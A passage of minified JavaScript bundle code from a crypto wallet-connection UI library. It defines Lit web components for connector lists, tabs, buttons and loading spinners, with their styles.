              imageSrc=${Ee(Mt.getConnectorImage(r))}
              .installed=${!0}
              name=${r.name??"Unknown"}
              tagVariant="success"
              tagLabel="installed"
              data-testid=${`wallet-selector-${r.id}`}
              @click=${()=>this.onConnector(r)}
              tabIdx=${Ee(this.tabIdx)}
            >
            </wui-list-wallet>
          `:null})}
      </wui-flex>
    `}onConnector(t){ae.setActiveConnector(t),se.push("ConnectingExternal",{connector:t})}};Xw([F()],Jp.prototype,"tabIdx",void 0),Xw([F()],Jp.prototype,"connectors",void 0),Jp=Xw([he("w3m-connect-injected-widget")],Jp);var em=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Qp=class extends fe{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=ae.state.connectors,this.unsubscribe.push(ae.subscribeKey("connectors",t=>this.connectors=t))}disconnectedCallback(){this.unsubscribe.forEach(t=>t())}render(){const t=this.connectors.filter(e=>e.type==="MULTI_CHAIN"&&e.name!=="WalletConnect");return t!=null&&t.length?U`
      <wui-flex flexDirection="column" gap="xs">
        ${t.map(e=>U`
            <wui-list-wallet
              imageSrc=${Ee(Mt.getConnectorImage(e))}
              .installed=${!0}
              name=${e.name??"Unknown"}
              tagVariant="shade"
              tagLabel="multichain"
              data-testid=${`wallet-selector-${e.id}`}
              @click=${()=>this.onConnector(e)}
              tabIdx=${Ee(this.tabIdx)}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnector(t){ae.setActiveConnector(t),se.push("ConnectingMultiChain")}};em([F()],Qp.prototype,"tabIdx",void 0),em([le()],Qp.prototype,"connectors",void 0),Qp=em([he("w3m-connect-multi-chain-widget")],Qp);var Yp=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let zh=class extends fe{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=ae.state.connectors,this.loading=!1,this.unsubscribe.push(ae.subscribeKey("connectors",t=>this.connectors=t)),te.isTelegram()&&te.isIos()&&(this.loading=!we.state.wcUri,this.unsubscribe.push(we.subscribeKey("wcUri",t=>this.loading=!t)))}render(){const t=pe.getRecentWallets().filter(e=>!Nc.isExcluded(e)).filter(e=>!this.hasWalletConnector(e)).filter(e=>this.isWalletCompatibleWithCurrentChain(e));return t.length?U`
      <wui-flex flexDirection="column" gap="xs">
        ${t.map(e=>U`
            <wui-list-wallet
              imageSrc=${Ee(Mt.getWalletImage(e))}
              name=${e.name??"Unknown"}
              @click=${()=>this.onConnectWallet(e)}
              tagLabel="recent"
              tagVariant="shade"
              tabIdx=${Ee(this.tabIdx)}
              ?loading=${this.loading}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnectWallet(t){this.loading||ae.selectWalletConnector(t)}hasWalletConnector(t){return this.connectors.some(e=>e.id===t.id||e.name===t.name)}isWalletCompatibleWithCurrentChain(t){const e=B.state.activeChain;return e&&t.chains?t.chains.some(r=>{const n=r.split(":")[0];return e===n}):!0}};Yp([F()],zh.prototype,"tabIdx",void 0),Yp([le()],zh.prototype,"connectors",void 0),Yp([le()],zh.prototype,"loading",void 0),zh=Yp([he("w3m-connect-recent-widget")],zh);var Xp=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let jh=class extends fe{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.wallets=[],this.loading=!1,te.isTelegram()&&te.isIos()&&(this.loading=!we.state.wcUri,this.unsubscribe.push(we.subscribeKey("wcUri",t=>this.loading=!t)))}render(){const{connectors:t}=ae.state,{customWallets:e,featuredWalletIds:r}=Y.state,n=pe.getRecentWallets(),i=t.find(l=>l.id==="walletConnect"),s=t.filter(l=>l.type==="INJECTED"||l.type==="ANNOUNCED"||l.type==="MULTI_CHAIN").filter(l=>l.name!=="Browser Wallet");if(!i)return null;if(r||e||!this.wallets.length)return this.style.cssText="display: none",null;const o=s.length+n.length,a=Math.max(0,2-o),c=Nc.filterOutDuplicateWallets(this.wallets).slice(0,a);return c.length?U`
      <wui-flex flexDirection="column" gap="xs">
        ${c.map(l=>U`
            <wui-list-wallet
              imageSrc=${Ee(Mt.getWalletImage(l))}
              name=${(l==null?void 0:l.name)??"Unknown"}
              @click=${()=>this.onConnectWallet(l)}
              tabIdx=${Ee(this.tabIdx)}
              ?loading=${this.loading}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnectWallet(t){if(this.loading)return;const e=ae.getConnector(t.id,t.rdns);e?se.push("ConnectingExternal",{connector:e}):se.push("ConnectingWalletConnect",{wallet:t})}};Xp([F()],jh.prototype,"tabIdx",void 0),Xp([F()],jh.prototype,"wallets",void 0),Xp([le()],jh.prototype,"loading",void 0),jh=Xp([he("w3m-connect-recommended-widget")],jh);var e0=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Hh=class extends fe{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=ae.state.connectors,this.connectorImages=Wr.state.connectorImages,this.unsubscribe.push(ae.subscribeKey("connectors",t=>this.connectors=t),Wr.subscribeKey("connectorImages",t=>this.connectorImages=t))}disconnectedCallback(){this.unsubscribe.forEach(t=>t())}render(){if(te.isMobile())return this.style.cssText="display: none",null;const t=this.connectors.find(r=>r.id==="walletConnect");if(!t)return this.style.cssText="display: none",null;const e=t.imageUrl||this.connectorImages[(t==null?void 0:t.imageId)??""];return U`
      <wui-list-wallet
        imageSrc=${Ee(e)}
        name=${t.name??"Unknown"}
        @click=${()=>this.onConnector(t)}
        tagLabel="qr code"
        tagVariant="main"
        tabIdx=${Ee(this.tabIdx)}
        data-testid="wallet-selector-walletconnect"
      >
      </wui-list-wallet>
    `}onConnector(t){ae.setActiveConnector(t),se.push("ConnectingWalletConnect")}};e0([F()],Hh.prototype,"tabIdx",void 0),e0([le()],Hh.prototype,"connectors",void 0),e0([le()],Hh.prototype,"connectorImages",void 0),Hh=e0([he("w3m-connect-walletconnect-widget")],Hh);var MG=Ae`
  :host {
    margin-top: var(--wui-spacing-3xs);
  }
  wui-separator {
    margin: var(--wui-spacing-m) calc(var(--wui-spacing-m) * -1) var(--wui-spacing-xs)
      calc(var(--wui-spacing-m) * -1);
    width: calc(100% + var(--wui-spacing-s) * 2);
  }
`,qh=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let oa=class extends fe{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=ae.state.connectors,this.recommended=oe.state.recommended,this.featured=oe.state.featured,this.unsubscribe.push(ae.subscribeKey("connectors",t=>this.connectors=t),oe.subscribeKey("recommended",t=>this.recommended=t),oe.subscribeKey("featured",t=>this.featured=t))}disconnectedCallback(){this.unsubscribe.forEach(t=>t())}render(){return U`
      <wui-flex flexDirection="column" gap="xs"> ${this.connectorListTemplate()} </wui-flex>
    `}connectorListTemplate(){const{custom:t,recent:e,announced:r,injected:n,multiChain:i,recommended:s,featured:o,external:a}=Ms.getConnectorsByType(this.connectors,this.recommended,this.featured);return Ms.getConnectorTypeOrder({custom:t,recent:e,announced:r,injected:n,multiChain:i,recommended:s,featured:o,external:a}).map(c=>{switch(c){case"injected":return U`
            ${i.length?U`<w3m-connect-multi-chain-widget
                  tabIdx=${Ee(this.tabIdx)}
                ></w3m-connect-multi-chain-widget>`:null}
            ${r.length?U`<w3m-connect-announced-widget
                  tabIdx=${Ee(this.tabIdx)}
                ></w3m-connect-announced-widget>`:null}
            ${n.length?U`<w3m-connect-injected-widget
                  .connectors=${n}
                  tabIdx=${Ee(this.tabIdx)}
                ></w3m-connect-injected-widget>`:null}
          `;case"walletConnect":return U`<w3m-connect-walletconnect-widget
            tabIdx=${Ee(this.tabIdx)}
          ></w3m-connect-walletconnect-widget>`;case"recent":return U`<w3m-connect-recent-widget
            tabIdx=${Ee(this.tabIdx)}
          ></w3m-connect-recent-widget>`;case"featured":return U`<w3m-connect-featured-widget
            .wallets=${o}
            tabIdx=${Ee(this.tabIdx)}
          ></w3m-connect-featured-widget>`;case"custom":return U`<w3m-connect-custom-widget
            tabIdx=${Ee(this.tabIdx)}
          ></w3m-connect-custom-widget>`;case"external":return U`<w3m-connect-external-widget
            tabIdx=${Ee(this.tabIdx)}
          ></w3m-connect-external-widget>`;case"recommended":return U`<w3m-connect-recommended-widget
            .wallets=${s}
            tabIdx=${Ee(this.tabIdx)}
          ></w3m-connect-recommended-widget>`;default:return console.warn(`Unknown connector type: ${c}`),null}})}};oa.styles=MG,qh([F()],oa.prototype,"tabIdx",void 0),qh([le()],oa.prototype,"connectors",void 0),qh([le()],oa.prototype,"recommended",void 0),qh([le()],oa.prototype,"featured",void 0),oa=qh([he("w3m-connector-list")],oa);var FG=Ae`
  :host {
    display: inline-flex;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-3xl);
    padding: var(--wui-spacing-3xs);
    position: relative;
    height: 36px;
    min-height: 36px;
    overflow: hidden;
  }

  :host::before {
    content: '';
    position: absolute;
    pointer-events: none;
    top: 4px;
    left: 4px;
    display: block;
    width: var(--local-tab-width);
    height: 28px;
    border-radius: var(--wui-border-radius-3xl);
    background-color: var(--wui-color-gray-glass-002);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    transform: translateX(calc(var(--local-tab) * var(--local-tab-width)));
    transition: transform var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: background-color, opacity;
  }

  :host([data-type='flex'])::before {
    left: 3px;
    transform: translateX(calc((var(--local-tab) * 34px) + (var(--local-tab) * 4px)));
  }

  :host([data-type='flex']) {
    display: flex;
    padding: 0px 0px 0px 12px;
    gap: 4px;
  }

  :host([data-type='flex']) > button > wui-text {
    position: absolute;
    left: 18px;
    opacity: 0;
  }

  button[data-active='true'] > wui-icon,
  button[data-active='true'] > wui-text {
    color: var(--wui-color-fg-100);
  }

  button[data-active='false'] > wui-icon,
  button[data-active='false'] > wui-text {
    color: var(--wui-color-fg-200);
  }

  button[data-active='true']:disabled,
  button[data-active='false']:disabled {
    background-color: transparent;
    opacity: 0.5;
    cursor: not-allowed;
  }

  button[data-active='true']:disabled > wui-text {
    color: var(--wui-color-fg-200);
  }

  button[data-active='false']:disabled > wui-text {
    color: var(--wui-color-fg-300);
  }

  button > wui-icon,
  button > wui-text {
    pointer-events: none;
    transition: color var(--wui-e ase-out-power-1) var(--wui-duration-md);
    will-change: color;
  }

  button {
    width: var(--local-tab-width);
    transition: background-color var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: background-color;
  }

  :host([data-type='flex']) > button {
    width: 34px;
    position: relative;
    display: flex;
    justify-content: flex-start;
  }

  button:hover:enabled,
  button:active:enabled {
    background-color: transparent !important;
  }

  button:hover:enabled > wui-icon,
  button:active:enabled > wui-icon {
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-lg);
    color: var(--wui-color-fg-125);
  }

  button:hover:enabled > wui-text,
  button:active:enabled > wui-text {
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-lg);
    color: var(--wui-color-fg-125);
  }

  button {
    border-radius: var(--wui-border-radius-3xl);
  }
`,eo=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Ci=class extends fe{constructor(){super(...arguments),this.tabs=[],this.onTabChange=()=>null,this.buttons=[],this.disabled=!1,this.localTabWidth="100px",this.activeTab=0,this.isDense=!1}render(){return this.isDense=this.tabs.length>3,this.style.cssText=`
      --local-tab: ${this.activeTab};
      --local-tab-width: ${this.localTabWidth};
    `,this.dataset.type=this.isDense?"flex":"block",this.tabs.map((t,e)=>{var n;const r=e===this.activeTab;return U`
        <button
          ?disabled=${this.disabled}
          @click=${()=>this.onTabClick(e)}
          data-active=${r}
          data-testid="tab-${(n=t.label)==null?void 0:n.toLowerCase()}"
        >
          ${this.iconTemplate(t)}
          <wui-text variant="small-600" color="inherit"> ${t.label} </wui-text>
        </button>
      `})}firstUpdated(){this.shadowRoot&&this.isDense&&(this.buttons=[...this.shadowRoot.querySelectorAll("button")],setTimeout(()=>{this.animateTabs(0,!0)},0))}iconTemplate(t){return t.icon?U`<wui-icon size="xs" color="inherit" name=${t.icon}></wui-icon>`:null}onTabClick(t){this.buttons&&this.animateTabs(t,!1),this.activeTab=t,this.onTabChange(t)}animateTabs(t,e){const r=this.buttons[this.activeTab],n=this.buttons[t],i=r==null?void 0:r.querySelector("wui-text"),s=n==null?void 0:n.querySelector("wui-text"),o=n==null?void 0:n.getBoundingClientRect(),a=s==null?void 0:s.getBoundingClientRect();r&&i&&!e&&t!==this.activeTab&&(i.animate([{opacity:0}],{duration:50,easing:"ease",fill:"forwards"}),r.animate([{width:"34px"}],{duration:500,easing:"ease",fill:"forwards"})),n&&o&&a&&s&&(t!==this.activeTab||e)&&(this.localTabWidth=`${Math.round(o.width+a.width)+6}px`,n.animate([{width:`${o.width+a.width}px`}],{duration:e?0:500,fill:"forwards",easing:"ease"}),s.animate([{opacity:1}],{duration:e?0:125,delay:e?0:200,fill:"forwards",easing:"ease"}))}};Ci.styles=[Qe,hr,FG],eo([F({type:Array})],Ci.prototype,"tabs",void 0),eo([F()],Ci.prototype,"onTabChange",void 0),eo([F({type:Array})],Ci.prototype,"buttons",void 0),eo([F({type:Boolean})],Ci.prototype,"disabled",void 0),eo([F()],Ci.prototype,"localTabWidth",void 0),eo([le()],Ci.prototype,"activeTab",void 0),eo([le()],Ci.prototype,"isDense",void 0),Ci=eo([he("wui-tabs")],Ci);var t0=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Vh=class extends fe{constructor(){super(),this.platformTabs=[],this.unsubscribe=[],this.platforms=[],this.onSelectPlatfrom=void 0,this.buffering=!1,this.unsubscribe.push(we.subscribeKey("buffering",t=>this.buffering=t))}disconnectCallback(){this.unsubscribe.forEach(t=>t())}render(){const t=this.generateTabs();return U`
      <wui-flex justifyContent="center" .padding=${["0","0","l","0"]}>
        <wui-tabs
          ?disabled=${this.buffering}
          .tabs=${t}
          .onTabChange=${this.onTabChange.bind(this)}
        ></wui-tabs>
      </wui-flex>
    `}generateTabs(){const t=this.platforms.map(e=>e==="browser"?{label:"Browser",icon:"extension",platform:"browser"}:e==="mobile"?{label:"Mobile",icon:"mobile",platform:"mobile"}:e==="qrcode"?{label:"Mobile",icon:"mobile",platform:"qrcode"}:e==="web"?{label:"Webapp",icon:"browser",platform:"web"}:e==="desktop"?{label:"Desktop",icon:"desktop",platform:"desktop"}:{label:"Browser",icon:"extension",platform:"unsupported"});return this.platformTabs=t.map(({platform:e})=>e),t}onTabChange(t){var r;const e=this.platformTabs[t];e&&((r=this.onSelectPlatfrom)==null||r.call(this,e))}};t0([F({type:Array})],Vh.prototype,"platforms",void 0),t0([F()],Vh.prototype,"onSelectPlatfrom",void 0),t0([le()],Vh.prototype,"buffering",void 0),Vh=t0([he("w3m-connecting-header")],Vh);var zG=Ae`
  :host {
    display: flex;
  }

  :host([data-size='sm']) > svg {
    width: 12px;
    height: 12px;
  }

  :host([data-size='md']) > svg {
    width: 16px;
    height: 16px;
  }

  :host([data-size='lg']) > svg {
    width: 24px;
    height: 24px;
  }

  :host([data-size='xl']) > svg {
    width: 32px;
    height: 32px;
  }

  svg {
    animation: rotate 2s linear infinite;
  }

  circle {
    fill: none;
    stroke: var(--local-color);
    stroke-width: 4px;
    stroke-dasharray: 1, 124;
    stroke-dashoffset: 0;
    stroke-linecap: round;
    animation: dash 1.5s ease-in-out infinite;
  }

  :host([data-size='md']) > svg > circle {
    stroke-width: 6px;
  }

  :host([data-size='sm']) > svg > circle {
    stroke-width: 8px;
  }

  @keyframes rotate {
    100% {
      transform: rotate(360deg);
    }
  }

  @keyframes dash {
    0% {
      stroke-dasharray: 1, 124;
      stroke-dashoffset: 0;
    }

    50% {
      stroke-dasharray: 90, 124;
      stroke-dashoffset: -35;
    }

    100% {
      stroke-dashoffset: -125;
    }
  }
`,tm=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Wh=class extends fe{constructor(){super(...arguments),this.color="accent-100",this.size="lg"}render(){return this.style.cssText=`--local-color: ${this.color==="inherit"?"inherit":`var(--wui-color-${this.color})`}`,this.dataset.size=this.size,U`<svg viewBox="25 25 50 50">
      <circle r="20" cy="50" cx="50"></circle>
    </svg>`}};Wh.styles=[Qe,zG],tm([F()],Wh.prototype,"color",void 0),tm([F()],Wh.prototype,"size",void 0),Wh=tm([he("wui-loading-spinner")],Wh);var jG=Ae`
  :host {
    width: var(--local-width);
    position: relative;
  }

  button {
    border: none;
    border-radius: var(--local-border-radius);
    width: var(--local-width);
    white-space: nowrap;
  }

  /* -- Sizes --------------------------------------------------- */
  button[data-size='md'] {
    padding: 8.2px var(--wui-spacing-l) 9px var(--wui-spacing-l);
    height: 36px;
  }

  button[data-size='md'][data-icon-left='true'][data-icon-right='false'] {
    padding: 8.2px var(--wui-spacing-l) 9px var(--wui-spacing-s);
  }

  button[data-size='md'][data-icon-right='true'][data-icon-left='false'] {
    padding: 8.2px var(--wui-spacing-s) 9px var(--wui-spacing-l);
  }

  button[data-size='lg'] {
    padding: var(--wui-spacing-m) var(--wui-spacing-2l);
    height: 48px;
  }

  /* -- Variants --------------------------------------------------------- */
  button[data-variant='main'] {
    background-color: var(--wui-color-accent-100);
    color: var(--wui-color-inverse-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-variant='inverse'] {
    background-color: var(--wui-color-inverse-100);
    color: var(--wui-color-inverse-000);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-variant='accent'] {
    background-color: var(--wui-color-accent-glass-010);
    color: var(--wui-color-accent-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  button[data-variant='accent-error'] {
    background: var(--wui-color-error-glass-015);
    color: var(--wui-color-error-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-error-glass-010);
  }

  button[data-variant='accent-success'] {
    background: var(--wui-color-success-glass-015);
    color: var(--wui-color-success-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-success-glass-010);
  }

  button[data-variant='neutral'] {
    background: transparent;
    color: var(--wui-color-fg-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  /* -- Focus states --------------------------------------------------- */
  button[data-variant='main']:focus-visible:enabled {
    background-color: var(--wui-color-accent-090);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0 0 0 4px var(--wui-color-accent-glass-020);
  }
  button[data-variant='inverse']:focus-visible:enabled {
    background-color: var(--wui-color-inverse-100);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-gray-glass-010),
      0 0 0 4px var(--wui-color-accent-glass-020);
  }
  button[data-variant='accent']:focus-visible:enabled {
    background-color: var(--wui-color-accent-glass-010);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0 0 0 4px var(--wui-color-accent-glass-020);
  }
  button[data-variant='accent-error']:focus-visible:enabled {
    background: var(--wui-color-error-glass-015);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-error-100),
      0 0 0 4px var(--wui-color-error-glass-020);
  }
  button[data-variant='accent-success']:focus-visible:enabled {
    background: var(--wui-color-success-glass-015);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-success-100),
      0 0 0 4px var(--wui-color-success-glass-020);
  }
  button[data-variant='neutral']:focus-visible:enabled {
    background: var(--wui-color-gray-glass-005);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-gray-glass-010),
      0 0 0 4px var(--wui-color-gray-glass-002);
  }

  /* -- Hover & Active states ----------------------------------------------------------- */
  @media (hover: hover) and (pointer: fine) {
    button[data-variant='main']:hover:enabled {
      background-color: var(--wui-color-accent-090);
    }

    button[data-variant='main']:active:enabled {
      background-color: var(--wui-color-accent-080);
    }

    button[data-variant='accent']:hover:enabled {
      background-color: var(--wui-color-accent-glass-015);
    }

    button[data-variant='accent']:active:enabled {
      background-color: var(--wui-color-accent-glass-020);
    }

    button[data-variant='accent-error']:hover:enabled {
      background: var(--wui-color-error-glass-020);
      color: var(--wui-color-error-100);
    }

    button[data-variant='accent-error']:active:enabled {
      background: var(--wui-color-error-glass-030);
      color: var(--wui-color-error-100);
    }

    button[data-variant='accent-success']:hover:enabled {
      background: var(--wui-color-success-glass-020);
      color: var(--wui-color-success-100);
    }

    button[data-variant='accent-success']:active:enabled {
      background: var(--wui-color-success-glass-030);
      color: var(--wui-color-success-100);
    }

    button[data-variant='neutral']:hover:enabled {
      background: var(--wui-color-gray-glass-002);
    }

    button[data-variant='neutral']:active:enabled {
      background: var(--wui-color-gray-glass-005);
    }

    button[data-size='lg'][data-icon-left='true'][data-icon-right='false'] {
      padding-left: var(--wui-spacing-m);
    }

    button[data-size='lg'][data-icon-right='true'][data-icon-left='false'] {
      padding-right: var(--wui-spacing-m);
    }
  }

  /* -- Disabled state --------------------------------------------------- */
  button:disabled {
    background-color: var(--wui-color-gray-glass-002);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    color: var(--wui-color-gray-glass-020);
    cursor: not-allowed;
  }

  button > wui-text {
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
    opacity: var(--local-opacity-100);
  }

  ::slotted(*) {
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
    opacity: var(--local-opacity-100);
  }

  wui-loading-spinner {
    position: absolute;
    left: 50%;
    top: 50%;
    transform: translate(-50%, -50%);
    opacity: var(--local-opacity-000);
  }
`,Ai=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};const l8={main:"inverse-100",inverse:"inverse-000",accent:"accent-100","accent-error":"error-100","accent-success":"success-100",neutral:"fg-100",disabled:"gray-glass-020"},HG={lg:"paragraph-600",md:"small-600"},qG={lg:"md",md:"md"};let Sn=class extends fe{constructor(){super(...arguments),this.size="lg",this.disabled=!1,this.fullWidth=!1,this.loading=!1,this.variant="main",this.hasIconLeft=!1,this.hasIconRight=!1,this.borderRadius="m"}render(){this.style.cssText=`
    --local-width: ${this.fullWidth?"100%":"auto"};
    --local-opacity-100: ${this.loading?0:1};
    --local-opacity-000: ${this.loading?1:0};
    --local-border-radius: var(--wui-border-radius-${this.borderRadius});
    `;const t=this.textVariant??HG[this.size];return U`
      <button
        data-variant=${this.variant}
        data-icon-left=${this.hasIconLeft}
        data-icon-right=${this.hasIconRight}
        data-size=${this.size}
        ?disabled=${this.disabled}
      >
        ${this.loadingTemplate()}
        <slot name="iconLeft" @slotchange=${()=>this.handleSlotLeftChange()}></slot>
        <wui-text variant=${t} color="inherit">
          <slot></slot>
        </wui-text>
        <slot name="iconRight" @slotchange=${()=>this.handleSlotRightChange()}></slot>
      </button>
    `}handleSlotLeftChange(){this.hasIconLeft=!0}handleSlotRightChange(){this.hasIconRight=!0}loadingTemplate(){if(this.loading){const t=qG[this.size],e=this.disabled?l8.disabled:l8[this.variant];return U`<wui-loading-spinner color=${e} size=${t}></wui-loading-spinner>`}return U``}};Sn.styles=[Qe,hr,jG],Ai([F()],Sn.prototype,"size",void 0),Ai([F({type:Boolean})],Sn.prototype,"disabled",void 0),Ai([F({type:Boolean})],Sn.prototype,"fullWidth",void 0),Ai([F({type:Boolean})],Sn.prototype,"loading",void 0),Ai([F()],Sn.prototype,"variant",void 0),Ai([F({type:Boolean})],Sn.prototype,"hasIconLeft",void 0),Ai([F({type:Boolean})],Sn.prototype,"hasIconRight",void 0),Ai([F()],Sn.prototype,"borderRadius",void 0),Ai([F()],Sn.prototype,"textVariant",void 0),Sn=Ai([he("wui-button")],Sn);var VG=Ae`
  button {
    padding: var(--wui-spacing-4xs) var(--wui-spacing-xxs);
    border-radius: var(--wui-border-radius-3xs);
    background-color: transparent;
    color: var(--wui-color-accent-100);
  }

  button:disabled {
    background-color: transparent;
    color: var(--wui-color-gray-glass-015);
  }

  button:hover {
    background-color: var(--wui-color-gray-glass-005);
  }
`,r0=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let fl=class extends fe{constructor(){super(...arguments),this.tabIdx=void 0,this.disabled=!1,this.color="inherit"}render(){return U`
      <button ?disabled=${this.disabled} tabindex=${Ee(this.tabIdx)}>
        <slot name="iconLeft"></slot>
        <wui-text variant="small-600" color=${this.color}>
          <slot></slot>
        </wui-text>
        <slot name="iconRight"></slot>
      </button>
    `}};fl.styles=[Qe,hr,VG],r0([F()],fl.prototype,"tabIdx",void 0),r0([F({type:Boolean})],fl.prototype,"disabled",void 0),r0([F()],fl.prototype,"color",void 0),fl=r0([he("wui-link")],fl);var WG=Ae`
  :host {
    display: block;
    width: var(--wui-box-size-md);
    height: var(--wui-box-size-md);
  }

  svg {
    width: var(--wui-box-size-md);
    height: var(--wui-box-size-md);
  }

  rect {
    fill: none;
    stroke: var(--wui-color-accent-100);
    stroke-width: 4px;
    stroke-linecap: round;
    animation: dash 1s linear infinite;
  }

  @keyframes dash {
    to {
      stroke-dashoffset: 0px;
    }
  }
`,u8=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let n0=class extends fe{constructor(){super(...arguments),this.radius=36}render(){return this.svgLoaderTemplate()}svgLoaderTemplate(){const t=this.radius>50?50:this.radius,e=36-t,r=116+e,n=245+e,i=360+e*1.75;return U`
      <svg viewBox="0 0 110 110" width="110" height="110">
        <rect
          x="2"
          y="2"
          width="106"
          height="106"
          rx=${t}
          stroke-dasharray="${r} ${n}"
          stroke-dashoffset=${i}
        />
      </svg>
    `}};n0.styles=[Qe,WG],u8([F({type:Number})],n0.prototype,"radius",void 0),n0=u8([he("wui-loading-thumbnail")],n0);var GG=Ae`
  button {
    border: none;
    border-radius: var(--wui-border-radius-3xl);
  }

  button[data-variant='main'] {
    background-color: var(--wui-color-accent-100);
    color: var(--wui-color-inverse-100);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-variant='accent'] {
    background-color: var(--wui-color-accent-glass-010);
    color: var(--wui-color-accent-100);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  button[data-variant='gray'] {
    background-color: transparent;
    color: var(--wui-color-fg-200);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-variant='shade'] {
    background-color: transparent;
    color: var(--wui-color-accent-100);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-size='sm'] {
    height: 32px;
    padding: 0 var(--wui-spacing-s);
  }

  button[data-size='md'] {
    height: 40px;
    padding: 0 var(--wui-spacing-l);
  }

  button[data-size='sm'] > wui-image {
    width: 16px;
    height: 16px;
  }

  button[data-size='md'] > wui-image {
    width: 24px;
    height: 24px;
